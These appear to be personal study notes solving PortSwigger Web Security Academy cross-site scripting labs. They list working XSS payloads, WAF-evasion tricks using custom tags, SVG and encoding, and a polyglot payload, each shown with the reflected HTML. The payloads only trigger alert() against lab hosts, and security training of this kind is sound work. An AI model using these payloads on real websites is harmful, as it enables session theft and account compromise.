# xss burp labs
https://portswigger.net/web-security/cross-site-scripting


#### Reflected XSS
https://portswigger.net/web-security/cross-site-scripting/reflected



# Exploiting cross-site scripting vulnerabilities - 3 labs
https://portswigger.net/web-security/cross-site-scripting/exploiting

<!-- Exploiting cross-site scripting to steal cookies -->
https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies
// require burp colaborator - not solved


<!-- Exploiting cross-site scripting to capture passwords -->
https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords
// require burp colaborator - not solved


<!-- Exploiting XSS to perform CSRF -->
https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf
// not solved



# Cross-site scripting contexts - 15 labs
https://portswigger.net/web-security/cross-site-scripting/contexts


<!-- Lab: Reflected XSS into HTML context with nothing encoded -->
https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded

search field:
<script>alert(1)</script>

<!-- Lab: Stored XSS into HTML context with nothing encoded -->
https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded

test 1 - <script>alert(document.cookie)</script>


<!-- Lab: Reflected XSS into HTML context with most tags and attributes blocked -->
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked
1. try baseline xss:
    GET /?search=<script>alert(1)</script> HTTP/1.1
    response:
    "Tag is not allowed"

2. check if tag not blocked using portswigger cheatsheet tag list via intruder:
    GET /?search=§§ HTTP/1.1

    200 responses:
    GET /?search=<body> HTTP/1.1          //not blocked!


3. check event for blockage (using portswigger cheatsheet event list via intruder:):
    GET /?search=§§ HTTP/1.1

    200 responses:
        GET /?search=<body%20onresize=1> HTTP/1.1          //not blocked!


4. lets craft an html page with an iframe containig the search payload. the iframe also contains a command (executed on load) to resize its width - causing the payload to be fired:
    <iframe src="https://0ac8001d04a89eb9c0751d16007f0036.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>

POP!


<!-- Lab: Reflected XSS into HTML context with all tags blocked except custom ones -->
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked
1. try baseline xss:
<script>alert(1)</script>
tags blocked!

2. check if tag not blocked using portswigger cheatsheet tag list via intruder:
all known tags are bloced

3. check custom tags sing portswigger cheatsheet tag list via intruder:
all custom tags are not blocked

lets look for a payload from custom tags:
<xss id=x tabindex=1 onfocus=alert(1)></xss>

we will put it in a link to the search term and add hash call ("#") for the tag "x":

<script>
location = 'https://0a310080041f2ce7c0c165c1004c0044.web-security-academy.net/?search=<xss id=x tabindex=1 onfocus=alert(1)></xss>#x';
</script>

explanation:
location =                                                                      // JS command elling browser to go to a 
'https://0a310080041f2ce7c0c165c1004c0044.web-security-academy.net/?search=     // exploitable URL and inject
<xss id=x tabindex=1 onfocus=alert(1)></xss>                                    // payload utilizing custom tag (to bypass waf)
#x                                                                              // and fire it up with hash (correspondes with id=x and uses tabindex to autofocus the element)

see: 
https://portswigger.net/research/one-xss-cheatsheet-to-rule-them-all



<!-- Lab: Reflected XSS with event handlers and href attributes blocked -->
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked

label your vector with the word "Click":
<a href="">Click me</a>

1. try baseline xss:
<script>alert(1)</script>
"Tag is not allowed" 400

2. check if tag not blocked using portswigger cheatsheet tag list via intruder:
GET /?search=§§ HTTP/1.1

200 responses:
GET /?search=<a> HTTP/1.1
GET /?search=<animate> HTTP/1.1
GET /?search=<image> HTTP/1.1
GET /?search=<svg> HTTP/1.1
GET /?search=<title> HTTP/1.1

3. try adoptaion of last payload with <a> tag
<a id=x tabindex=1\000onfocus=alert(1)>Click me</a>
"Event is not allowed" 400

4. check event types for blockage (using portswigger cheatsheet event list via intruder:):
all event in the cheetlist are blocked by waf

5. look for eventless payload - using find on the cheetsheet for animate we get:
<svg x=">" onload=alert(1)> 

breakdown:
//    1. the ">" makes WAF thinks its the end of the tag so he doesnt block the onload event handler. 
//    2. why it works also without the "click" string - IDK

POP!

original Polyglot XSS payload:
-->'"/></sCript><svG x=">" onload=(co\u006efirm)``>
by @s0md3v from:
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#polyglot-xss


portswiggers payload (requiers user interaction)
<svg><a><animate attributeName=href values=javascript:alert(2) /><text x=20 y=20>Click me</text></a>

    <!-- breakdown:
    <svg>   // whitelisted tag 
        <a>     // whitelisted tag ??? why need 2 tags?
            <animate attributeName=href values=javascript:alert(1) />
            <text x=20 y=20>Click me</text>
    </a> -->

==

<!-- Lab: Reflected XSS with some SVG markup allowed -->
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed

<svg x=">" onload=alert(1)> 

<!-- Lab: Reflected XSS into attribute with angle brackets HTML-encoded -->
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded
<script>alert(1)</script>
reflects twice on page:
1. inside a header:
    <h1>0 search results for ''&gt;&lt;script&gt;alert(1)&lt;/script&gt;'o'</h1>
2. in the search bar:
    <input type="text" placeholder="Search the blog..." name="search" value="<script>alert(1)</script>">

the <h1> tag escape tries fails so going to <input> tag and changing to event handler payload:
    " autofocus onfocus=alert(document.domain) x="
reflected as:
    <input type="text" placeholder="Search the blog..." name="search" value="" autofocus="" onfocus="alert(document.domain)" x="">
POP!



<!-- Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded -->
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded


To solve this lab, submit a comment that calls the alert function when the comment author name is clicked. 

1 try:
POST /post/comment HTTP/1.1

csrf=zldcOMiQQXjD7RtgPjTfwZEypoHRh2KP&postId=4&comment=walla%3F&name=hacker&email=clean%40token.com&website=test.com

response:
<p><img src="/resources/images/avatarDefault.svg" class="avatar"><a id="author" href="website=test.com">hacker</a> | 03 July 2022</p>

change href attribute value from "website=test.com" to "javascript:alert()" and resend via repeater

now we get clickble link that preform XSS POC

POP!

<!-- Lab: Reflected XSS in canonical link tag -->
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag

for canonical manipultion lets try adding arbitary paramaeter to the URL:
    ?test
full path: 
    https://0a4100be0430aa3bc0926f20007d0094.web-security-academy.net/?test

reflect:
    <head>
    ..
        <link rel="canonical" href='https://0a4100be0430aa3bc0926f20007d0094.web-security-academy.net/?test'/>
    ..
    </head>

lets change "?test" with payload:
    ?'accesskey='x'onclick='alert(1)


payload breakdown:
    ?                   // param
    '                   //breaks out of href field - wired since in js it uses ". maybe php back server uses ' ?
    accesskey='x'       // define shortcut key "x"  
    onclick='alert(1)   // when accessed via "x" key preform this action 

    // **access key to be accessed by ALT+SHIF+"x" in firefox.(in chrome/IE/safari/Opera15+ its just ALT+"X")


full path:
    https://0acb007104d7d0f9c07124ee00810023.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)


reflection:
    <head>
    ..
        <link rel="canonical" href="https://0acb007104d7d0f9c07124ee00810023.web-security-academy.net/?" accesskey="x" onclick="alert(1)">
    
    <!-- no need for user interaction if we just use autofocus onfocus?
    ?'autofocus+onfocus%3dalert()
    full path
    https://0a4100be0430aa3bc0926f20007d0094.web-security-academy.net/?'autofocus+onfocus%3dalert()

    ?tabindex=1+id=x+onfocus%3dalert(3) -->


<!-- Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped -->
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped

hint:
</script><img src=1 onerror=alert(document.domain)>

test - search for test and look for reflections:
GET /?search=test HTTP/1.1

reflection:
    <script>
        var searchTerms = 'test';
        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
    </script>

payload to escape the code:
</script><img src=1 onerror=alert(document.domain)>

reflection:
    <script>
        var searchTerms = '\'</script><img src=1 onerror=alert(document.domain)>';
        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
    </script>



POP!

<!-- Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded -->
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded

hints:
    '-alert(document.domain)-'
    ';alert(document.domain)//


test - search for test and look for reflections:
GET /?search=test HTTP/1.1

reflection:
    <script>
        var searchTerms = 'test';
        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
    </script>

trying prevoius payload:
'</script><img src=1 onerror=alert(document.domain)>

reflection:
                   <script>
                        var searchTerms = ''&lt;/script&gt;&lt;img src=1 onerror=alert(document.domain)&gt;';
                        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
                    </script>

payloads (since we already inside script) - both works:
';alert(document.domain)//
'-alert(document.domain)-'

reflections:
    <script>
        var searchTerms = '';alert(document.domain)//';
        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
    </script>
    <script>
        var searchTerms = ''-alert(document.domain)-'';
        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
    </script>

POP!

<!-- Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped -->
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped

test last payload:
    GET /?search=';alert(document.domain)//  HTTP/1.1

reflection
    <script>
        var searchTerms = '\';alert(document.domain)//';
        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
    </script>

' is escaped

use double escape ' to breakout:
    GET /?search=\';alert(document.domain)// HTTP/1.1

reflection:
    <script>
        var searchTerms = '\\';alert(document.domain)//';
        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
    </script>

payload:
    \';alert(document.domain)//


<!-- Lab: Reflected XSS in a JavaScript URL with some characters blocked -->
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked

hint:
    onerror=alert;throw 1

test:
POST /post/comment HTTP/1.1

csrf=L51ljiFGeK4JW8fE59ZWWdebbnezsNCc&postId=3&comment=test&name=test&email=clean%40token.com&website=https:test.

reflection
    <p>
    <img src="/resources/images/avatarDefault.svg" class="avatar"><a id="author" href="http://test.">test</a> | 03 July 2022
    </p>

check1:
    https://'<script>alert()</script>

reflection:
    <a id="author" href="https://&apos;&lt;script&gt;alert()&lt;/script&gt;">test</a>

check2:
https://"+onerror=alert;throw+1337

<a id="author" href="https://&quot; onerror=alert;throw 1337">test</a>

https://0a1800cb03087020c0b574f400240037.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27


port solution:
'},x=x=>{throw/**/onerror=alert,1337},toString=x,window%2b'',{x:'

???


<!-- Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped -->
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped

try:
    http://alert')
reflection:
    <a id="author" href="http://alert\')" onclick="var tracker={track(){}};tracker.track('http://alert\')');">

try:
    http://alert\')
reflection:
    <a id="author" href="http://alert\')" onclick="var tracker={track(){}};tracker.track('http://alert\\\');">
learned: \ and ' are escaped

try (aubstitues to '):
    '%27\x27&#39;&apos;
reflect:
    <a id="author" href="http://\'\'\\x27&#39;&apos;" onclick="var tracker={track(){}};tracker.track('http://\'\'\\x27&#39;&apos;');">
learned: hex escape (\x00) and octa escape(\00)) are useless here


try (HtmlEnc --> UrlEnc):
    http://&apos;&#37;&#50;&#55;&#92;&#120;&#50;&#55;&amp;&#35;&#51;&#57;&#59;&amp;&#97;&#112;&#111;&#115;&#59;alert")
        http://%26apos%3b%26%2337%3b%26%2350%3b%26%2355%3b%26%2392%3b%26%23120%3b%26%2350%3b%26%2355%3b%26amp%3b%26%2335%3b%26%2351%3b%26%2357%3b%26%2359%3b%26amp%3b%26%2397%3b%26%23112%3b%26%23111%3b%26%23115%3b%26%2359;alert")
reflect:
 <a id="author" href="http://&apos;&#37;&#50;&#55;&#92;&#120;&#50;&#55;&amp;&#35;&#51;&#57;&#59;&amp;&#97;&#112;&#111;&#115;&#59;alert&quot;)" onclick="var tracker={track(){}};tracker.track('http://&apos;&#37;&#50;&#55;&#92;&#120;&#50;&#55;&amp;&#35;&#51;&#57;&#59;&amp;&#97;&#112;&#111;&#115;&#59;alert&quot;)');">

browser do URL decode but not HTML decode


" http://alert "
' http://alert '
are they different? '/" ?

try:
    http://alert")
reflect:
<a id="author" href="http://alert&quot;)" onclick="var tracker={track(){}};tracker.track('http://alert&quot;)');">

try:
    "%22\x22&#34;&quot;
reflect:
    <a id="author" href="http://&quot;&quot;\\x22&#34;&quot;tpalert&quot;)" onclick="var tracker={track(){}};tracker.track('http://&quot;&quot;\\x22&#34;&quot;tpalert&quot;)');">


try (aubstitues to '):
    http://'%27%26#39;%26apos;alert()
try (urlencoded X1)
'%2527%26%2339%3b%26apos%3balert

reflect:
    <a id="author" href="http://\'%27%26#39;%26apos;alert()" onclick="var tracker={track(){}};tracker.track('http://\'%27%26#39;%26apos;alert()');">

try (urlencode X2):
http%3a//'%2527%2526%2339%3b%2526apos%3balert()
    <a id="author" href="http://\'%27%26#39;%26apos;alert()" onclick="var tracker={track(){}};tracker.track('http://\'%27%26#39;%26apos;alert()');">


try:
https://0a1c00a404fd51e9c1e76ff900ec007f.web-security-academy.net/%26#39;'--%0d%0a;alert(document.domain)//
ref:
https://0a1c00a404fd51e9c1e76ff900ec007f.web-security-academy.net/'/'--!%3E;alert(document.domain)//



post solutions:
http://foo?&apos;-alert(1)-&apos;

?? do you send it as is or do you url encode the & ?




<!-- Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped -->
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped

hint:
    ${alert(document.domain)}

try:
test`\
ref:
    <script>
        var message = `0 search results for 'test\u0060\u005c'`;
        document.getElementById('searchMessage').innerText = message;
    </script>

payload:
${alert(document.domain)} 



$) // just to close previous topic


# AngularJS sandbox
https://portswigger.net/web-security/cross-site-scripting/contexts/angularjs-sandbox


<!-- Lab: Reflected XSS with AngularJS sandbox escape without strings -->

<script>angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
    $scope.query = {};
    var key = 'search';
    $scope.query[key] = 'test';
    $scope.value = $parse(key)($scope.query);
});</script>










<!-- 


% <!-- failed attempts3:
% found this field - it might reflect on canonical href link in header:
% <input required type="hidden" name="postId" value="1">

% reflection:

% HTTP/1.1 200 OK
% Content-Type: text/html; charset=utf-8
% Connection: close
% Content-Length: 9037

% <!DOCTYPE html>
% <html>
%     <head>
%         <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
%         <link href=/resources/css/labsBlog.css rel=stylesheet>
%         <link rel="canonical" href='https://0acb007104d7d0f9c07124ee00810023.web-security-academy.net/post?postId=1'/>
%         <title>


% reflection:
% <p><img src="/resources/images/avatarDefault.svg" class="avatar"><a id="author" href="http://test.com" rel="canonical">test</a> | 03 July 2022</p>






% <link rel="canonical" href='https://0acb007104d7d0f9c07124ee00810023.web-security-academy.net/post?postId=3'/>

% <button accesskey="h" title="Caption" id="btn1">Hover me</button> -->



 <!-- 
% <!-- unsuccessful tries2
% input:
% name: injectable_input
% reflection:
% <p><img src="/resources/images/avatarDefault.svg" class="avatar">injectable_input | 03 July 2022</p>

% 1st try the hint:
% <a href="javascript:alert(document.domain)">click me</a>
% reflected as: 
% <p><img src="/resources/images/avatarDefault.svg" class="avatar">&lt;a href="javascript:alert(document.domain)"&gt;click me&lt;/a&gt; | 03 July 2022</p>

% lets escape from <img> tag first:
% <a href="javascript:alert()">click</a>





% <a href=javascript:alert(2) /><text x=20 y=20>Click</text></a>



% svg><a><animate attributeName=href values=javascript:alert(2) /><text x=20 y=20>Click me</text></a>

% <input type="button" value="Login" onClick="pasuser(<parameters>)">

% <section class="comment">
%     <p><img src="/resources/images/avatarDefault.svg" class="avatar">name | date</p>
%     <p>comment</p>
% </section> -->




<!-- unsuccessful tries:
% <a id=x tabindex=1&#x26;#x20;onfocus=alert(1)>Click me</a>
% <a id=x tabindex=1 (o\u006focus)=alert(1)>Click me</a>
% <a (o\u006cliCk)=alert()


% " " (space):
% &#x20;      //hex
% &#32;       //numeric

% %u0020

% "&" (ampersand):
% &#x26;      //html hex
% &#38;       //html numeric


% "o"
% &#111; //HTML encode numeric - browser decode relection
% &#x6f; //HTML encode hex - - browser decode relection
% %6f // URL encode
% %u006f // URL encode unicode
% \u006f // unicode escaping
% \x6f //HEX escaping
% \ --> -->

